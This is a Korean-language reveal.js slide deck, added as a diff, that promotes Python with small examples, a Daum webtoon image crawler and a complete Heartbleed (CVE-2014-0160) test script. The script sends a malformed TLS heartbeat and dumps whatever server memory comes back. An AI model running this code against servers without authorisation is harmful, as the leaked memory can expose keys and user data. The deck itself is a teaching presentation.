@@ -1,0 +1,428 @@
+<!doctype html>
+<html lang="en">
+
+	<head>
+		<meta charset="utf-8">
+
+		<title>Python</title>
+
+		<meta name="description" content="Lucene with hadoop">
+		<meta name="author" content="Mr.Jump kwangjin Kim">
+
+		<meta name="apple-mobile-web-app-capable" content="yes" />
+		<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+		<link rel="stylesheet" href="http://lab.hakim.se/reveal-js/css/reveal.min.css">
+		<link rel="stylesheet" href="http://lab.hakim.se/reveal-js/css/theme/default.css" id="theme">
+
+		<!-- For syntax highlighting -->
+		<link rel="stylesheet" href="http://lab.hakim.se/reveal-js/lib/css/zenburn.css">
+
+		<!-- If the query includes 'print-pdf', include the PDF print sheet -->
+		<script>
+			if( window.location.search.match( /print-pdf/gi ) ) {
+				var link = document.createElement( 'link' );
+				link.rel = 'stylesheet';
+				link.type = 'text/css';
+				link.href = 'http://lab.hakim.se/reveal-js/css/print/pdf.css';
+				document.getElementsByTagName( 'head' )[0].appendChild( link );
+			}
+		</script>
+
+		<!--[if lt IE 9]>
+		<script src="http://lab.hakim.se/reveal-js/lib/js/html5shiv.js"></script>
+		<![endif]-->
+	</head>
+
+	<body>
+
+		<div class="reveal">
+
+			<!-- Any section element inside of this container is displayed as a slide -->
+			<div class="slides">
+
+				<section data-markdown>
+				# ***Python***
+				</section>
+				
+<section >
+<section data-markdown>
+# *Introduction*
+</section>
+<section data-markdown>
+## 제작자
+ - 귀도 반 로섬
+ 
+![인물](http://upload.wikimedia.org/wikipedia/commons/thumb/6/66/Guido_van_Rossum_OSCON_2006.jpg/225px-Guido_van_Rossum_OSCON_2006.jpg)
+</section>
+<section data-markdown>
+## 특징 (1)
+ - dynamic typing
+ - 객체의 멤버에 무제한으로 접근 가능
+</section>
+<section data-markdown>
+## 특징 (2)
+ - cpython
+ - jython
+ - ironPython
+ - PyPy
+</section>
+</section>
+
+<section data-markdown>
+# 와닿지 않는다!!!
+</section>
+
+<section data-markdown>
+### 실용 사례를 봅시다
+</section>
+
+<section>
+<section data-markdown>
+## ***간단한 숫자 놀이***
+</section>
+<section data-markdown>
+### 간단한 팩토리얼을 계산 할 땐 이렇게...
+
+*(interactive mode 로 가볍게...)*
+
+```python
+import math
+math.factorial(math.factorial(8))
+```
+</section>
+<section data-markdown>
+### 간단한 구구단
+
+*(interactive mode 로 가볍게...)*
+
+```python
+[ x*y for x in range(2,10) for y in range(1,10)]
+```
+</section>
+</section>
+
+<section data-markdown>
+### 언제까지 숫자 놀음만??
+</section>
+
+<section >
+<section data-markdown>
+## 비행기 안에서도 웹툰을!!!
+### *webtoon crawler*
+``` python
+import os
+import urllib
+import urllib2
+import json
+import re
+
+daumBase = 'http://cartoon.media.daum.net'
+imageInfo = '/webtoon/viewer_images.js?webtoon_episode_id='
+viewerUrl = '/webtoon/viewer/'
+
+origEncode = 'utf-8'
+sysEncode = 'MS949'
+downloadID = 18209 
+
+def ready_for_download(cartoonNum):
+	req1 = urllib2.Request(daumBase+viewerUrl+str(cartoonNum))
+	response = urllib2.urlopen(req1)
+	cookie = response.headers.get('Set-Cookie')
+	m = re.search('Webtoon\.RheaViewer\.init\(\'[0-9\,]*?\'',unicode(response.read(),origEncode).encode(sysEncode))
+	cartoonIdList = m.group(0).replace("Webtoon.RheaViewer.init('","[").replace("'","]")
+	print cartoonIdList
+	cartoonIdData = json.loads(cartoonIdList)
+	return cookie, cartoonIdData
+
+def get_episode_json(cookie, index):
+	req2 = urllib2.Request(daumBase + imageInfo + str(index) )
+	req2.add_header('cookie', cookie)
+	response = urllib2.urlopen(req2)
+	jsontxt = unicode(response.read(),origEncode)
+	resultJson = json.loads(jsontxt)
+	return resultJson
+
+def download_cartoon(title, episodeName, image):
+	if not os.path.isdir(title.encode(sysEncode)):
+		os.mkdir(title.encode(sysEncode))
+	episodeName = episodeName.replace('\\','')
+	episodeName = episodeName.replace('/','')
+	episodeName = episodeName.replace(':','')
+	episodeName = episodeName.replace('*','')
+	episodeName = episodeName.replace('?','')
+	episodeName = episodeName.replace('"','')
+	episodeName = episodeName.replace('<','')
+	episodeName = episodeName.replace('>','')
+	episodeName = episodeName.replace('|','')
+	episodeDir = title+'\\'+ episodeName
+	if not os.path.isdir(episodeDir.encode(sysEncode)):
+		os.mkdir(episodeDir.encode(sysEncode))
+	file_path = episodeDir+'\\'+ str(image['imageOrder']) +'.jpg'
+	print file_path.encode(sysEncode)
+	if os.path.exists(file_path.encode(sysEncode)) :
+		print (unicode('존재 하는 파일 입니다 : ',origEncode)+file_path).encode(sysEncode)
+		return -1
+	downloaded_image = file(file_path.encode(sysEncode), "wb")
+	image_on_web = urllib.urlopen(image['url'])
+	while True:
+		buf = image_on_web.read(65536)
+		if len(buf) == 0:
+			break
+		downloaded_image.write(buf)
+	downloaded_image.close()
+	image_on_web.close()
+	return 0
+
+def main(ID_Cartoon):
+	cookie, cartoonIdData = ready_for_download(ID_Cartoon)
+	count = 1;
+	for cartoonId in cartoonIdData :
+		print str(count) + "####" + str(cartoonId)
+		episodeJson = get_episode_json(cookie, cartoonId)
+		for image in episodeJson['images'] :
+			result = download_cartoon(episodeJson['title'], str(count)+"_"+episodeJson['episodeTitle'], image)
+			if (result == -1) :
+				print unicode("오류발생",origEncode).encode(sysEncode)
+		count += 1
+
+if __name__=="__main__":
+	main(downloadID)
+```
+</section>
+<section data-markdown>
+## ***해킹 보안 놀이***
+### ***Heart bleed bug test***
+``` python
+
+import sys
+import struct
+import socket
+import time
+import select
+import re
+from optparse import OptionParser
+  
+options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
+options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
+  
+def h2bin(x):
+    return x.replace(' ', '').replace('\n', '').decode('hex')
+  
+version = []
+version.append(['SSL 3.0','03 00'])
+version.append(['TLS 1.0','03 01'])
+version.append(['TLS 1.1','03 02'])
+version.append(['TLS 1.2','03 03'])
+  
+def create_hello(version):
+    hello = h2bin('16 ' + version + ' 00 dc 01 00 00 d8 ' + version + ''' 53
+43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
+bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
+00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
+00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
+c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
+c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
+c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
+c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
+00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
+03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
+00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
+00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
+00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
+00 0f 00 01 01
+''')
+    return hello
+  
+def create_hb(version):
+    hb = h2bin('18 ' + version + ' 00 03 01 40 00')
+    return hb
+  
+def hexdump(s):
+    for b in xrange(0, len(s), 16):
+        lin = [c for c in s[b : b + 16]]
+        hxdat = ' '.join('%02X' % ord(c) for c in lin)
+        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
+        print ('  %04x: %-48s %s', b, hxdat, pdat)
+    print
+  
+def recvall(s, length, timeout=5):
+    endtime = time.time() + timeout
+    rdata = ''
+    remain = length
+    while remain > 0:
+        rtime = endtime - time.time()
+        if rtime < 0:
+            return None
+        r, w, e = select.select([s], [], [], 5)
+        if s in r:
+            data = s.recv(remain)
+            # EOF?
+            if not data:
+                return None
+            rdata += data
+            remain -= len(data)
+    return rdata
+  
+  
+def recvmsg(s):
+    hdr = recvall(s, 5)
+    if hdr is None:
+        print ('Unexpected EOF receiving record header - server closed connection')
+        return None, None, None
+    typ, ver, ln = struct.unpack('>BHH', hdr)
+    pay = recvall(s, ln, 10)
+    if pay is None:
+        print ('Unexpected EOF receiving record payload - server closed connection')
+        return None, None, None
+    print (' ... received message: type = %d, ver = %04x, length = %d' , typ, ver, len(pay) )
+    return typ, ver, pay
+  
+def hit_hb(s,hb):
+    s.send(hb)
+    while True:
+        typ, ver, pay = recvmsg(s)
+        if typ is None:
+            print ('No heartbeat response received, server likely not vulnerable')
+            return False
+  
+        if typ == 24:
+            print ('Received heartbeat response:')
+            hexdump(pay)
+            if len(pay) > 3:
+                print ('WARNING: server returned more data than it should - server is vulnerable!')
+            else:
+                print ('Server processed malformed heartbeat, but did not return any extra data.')
+            return True
+  
+        if typ == 21:
+            print ('Received alert:')
+            hexdump(pay)
+            print ('Server returned error, likely not vulnerable')
+            return False
+  
+def main():
+    opts, args = options.parse_args()
+    if len(args) < 1:
+        options.print_help()
+        return
+    for i in range(len(version)):
+        print ('Trying ' + version[i][0] + '...')
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        print ('Connecting...')
+        sys.stdout.flush()
+        s.connect((args[0], opts.port))
+        print ('Sending Client Hello...')
+        sys.stdout.flush()
+        s.send(create_hello(version[i][1]))
+        print ('Waiting for Server Hello...')
+        sys.stdout.flush()
+        while True:
+            typ, ver, pay = recvmsg(s)
+            if typ == None:
+                print ('Server closed connection without sending Server Hello.')
+                return
+            # Look for server hello done message.
+            if typ == 22 and ord(pay[0]) == 0x0E:
+                break
+  
+        print ('Sending heartbeat request...')
+        sys.stdout.flush()
+        s.send(create_hb(version[i][1]))
+        if hit_hb(s,create_hb(version[i][1])):
+            #Stop if vulnerable
+            break
+  
+if __name__ == '__main__':
+    main()
+```
+ </section>
+<section data-markdown>
+### 대부분의 network 관련 exploit 코드들이 python으로 올라오더라
+</section>
+</section>
+
+<section>
+<section data-markdown>
+### ***이것저것 다 개발해 보고싶다***
+</section>
+<section data-markdown>
+## Web 이라면!!
+![장고로고](https://www.djangoproject.com/s/img/site/hdr_logo.b19c5e60269d.gif)
+
+
+![오픈스택로고](http://docs.openstack.org/developer/horizon/_static/openstack_logo.png)
+ </section>
+<section data-markdown>
+## 게임은!!
+![pygame](http://www.pygame.org/skins/main/pygame_logo_bot.gif)
+</section>
+<section data-markdown>
+## 크롤러는!!
+- 기본 httplib, httplib2 로도 충분하지만...
+- ***BeutifulSoup***
+</section>
+</section>
+
+<section>
+<section data-markdown>
+# ***결 론***
+</section>
+<section data-markdown>
+- 파이썬 만큼 다용도 언어는 보기 힘들다.
+- 파이썬 만큼 개발 편한 언어도 보기 힘들다.
+- 파이썬 만큼 라이브러리 관리편한 언어도 보기 힘들다.
+
+
+### ***파이썬 만큼 좋은 툴은 보기 힘들다.***
+</section>
+<section data-markdown>
+## *** 더 중요한 사실은 ***
+
+잘하는 애는 도구 안가리고 잘하더라..
+</section>
+</section>
+<section data-markdown>
+## *** 감사합니다 ***
+</section>
+			</div>
+
+		</div>
+
+		<script src="http://lab.hakim.se/reveal-js/lib/js/head.min.js"></script>
+		<script src="http://lab.hakim.se/reveal-js/js/reveal.min.js"></script>
+
+		<script>
+
+			// Full list of configuration options available here:
+			// https://github.com/hakimel/reveal.js#configuration
+			Reveal.initialize({
+				controls: true,
+				progress: true,
+				history: true,
+				center: true,
+
+				theme: Reveal.getQueryHash().theme, // available themes are in /css/theme
+				transition: Reveal.getQueryHash().transition || 'default', // default/cube/page/concave/zoom/linear/fade/none
+
+				// Parallax scrolling
+				// parallaxBackgroundImage: 'https://s3.amazonaws.com/hakim-static/reveal-js/reveal-parallax-1.jpg',
+				// parallaxBackgroundSize: '2100px 900px',
+
+				// Optional libraries used to extend on reveal.js
+				dependencies: [
+					{ src: 'http://lab.hakim.se/reveal-js/lib/js/classList.js', condition: function() { return !document.body.classList; } },
+					{ src: 'http://lab.hakim.se/reveal-js/plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'http://lab.hakim.se/reveal-js/plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'http://lab.hakim.se/reveal-js/plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
+					{ src: 'http://lab.hakim.se/reveal-js/plugin/zoom-js/zoom.js', async: true, condition: function() { return !!document.body.classList; } },
+					{ src: 'http://lab.hakim.se/reveal-js/plugin/notes/notes.js', async: true, condition: function() { return !!document.body.classList; } }
+				]
+			});
+
+		</script>
+
+	</body>
+</html>
